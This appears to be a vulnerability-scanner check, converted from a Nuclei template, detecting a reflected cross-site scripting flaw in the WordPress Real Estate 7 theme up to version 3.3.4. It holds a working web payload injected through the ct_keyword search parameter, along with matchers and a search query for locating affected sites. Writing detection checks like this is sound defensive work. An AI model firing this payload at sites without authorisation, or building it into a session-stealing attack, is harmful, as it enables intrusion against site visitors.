@@ -1,0 +1,137 @@
+{
+  "id": "wp-real-estate-xss",
+  "name": "WordPress Real Estate 7 Theme \u003c\u003d 3.3.4 - Cross-Site Scripting",
+  "author": "Harsh",
+  "severity": "MEDIUM",
+  "description": "The Real Estate 7 premium theme for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) attack vector in versions up to, and including, v3.3.4 via the \u0027ct_additional_features\u0027 option due to insufficient input sanitization and output escaping. This vulnerability allows unauthenticated attackers to inject malicious JavaScript payload in the search page that execute if they can trick a user into performing an action such as clicking on a link.\n",
+  "references": [
+    "https://www.exploitalert.com/view-details.html?id\u003d39344",
+    "https://packetstormsecurity.com/files/171186/WordPress-Real-Estate-7-Theme-3.3.4-Cross-Site-Scripting.html",
+    "https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778"
+  ],
+  "tags": [
+    "packetstorm",
+    "wordpress",
+    "wp-theme",
+    "wp",
+    "xss",
+    "realestate"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "publicwww": "/wp-content/themes/realestate-7/"
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "cweId": "CWE-79",
+  "cvssScore": "6.1",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "method": "GET",
+      "path": "{{BaseURL}}/?ct_keyword\u003d%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E\u0026ct_city\u003d0\u0026ct_state\u003d0\u0026ct_zipcode\u003d0\u0026search-listings\u003dtrue\u0026ct_property_type\u003d0\u0026ct_beds\u003d0\u0026ct_baths\u003d0\u0026ct_price_from\u0026ct_price_to",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code \u003d\u003d 200",
+            "contains(content_type, \"text/html\")",
+            "contains(body, \"\u003cimg src\u003dx onerror\u003dprompt(document.domain)\u003e\")",
+            "contains(body, \"/wp-content/themes/realestate-7/\")"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "wp-real-estate-xss",
+    "info": {
+      "name": "WordPress Real Estate 7 Theme \u003c\u003d 3.3.4 - Cross-Site Scripting",
+      "author": "Harsh",
+      "severity": "medium",
+      "description": "The Real Estate 7 premium theme for WordPress is vulnerable to Reflected Cross-Site Scripting (XSS) attack vector in versions up to, and including, v3.3.4 via the \u0027ct_additional_features\u0027 option due to insufficient input sanitization and output escaping. This vulnerability allows unauthenticated attackers to inject malicious JavaScript payload in the search page that execute if they can trick a user into performing an action such as clicking on a link.\n",
+      "reference": [
+        "https://www.exploitalert.com/view-details.html?id\u003d39344",
+        "https://packetstormsecurity.com/files/171186/WordPress-Real-Estate-7-Theme-3.3.4-Cross-Site-Scripting.html",
+        "https://themeforest.net/item/wp-pro-real-estate-7-responsive-real-estate-wordpress-theme/12473778"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+        "cvss_score": "6.1",
+        "cwe_id": "CWE-79"
+      },
+      "metadata": {
+        "max_request": 1,
+        "publicwww_query": "/wp-content/themes/realestate-7/"
+      },
+      "tags": "packetstorm,wordpress,wp-theme,wp,xss,realestate"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "method": "GET",
+        "redirects": false,
+        "path": [
+          "{{BaseURL}}/?ct_keyword\u003d%22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3E\u0026ct_city\u003d0\u0026ct_state\u003d0\u0026ct_zipcode\u003d0\u0026search-listings\u003dtrue\u0026ct_property_type\u003d0\u0026ct_beds\u003d0\u0026ct_baths\u003d0\u0026ct_price_from\u0026ct_price_to"
+        ],
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code \u003d\u003d 200",
+              "contains(content_type, \"text/html\")",
+              "contains(body, \"\u003cimg src\u003dx onerror\u003dprompt(document.domain)\u003e\")",
+              "contains(body, \"/wp-content/themes/realestate-7/\")"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
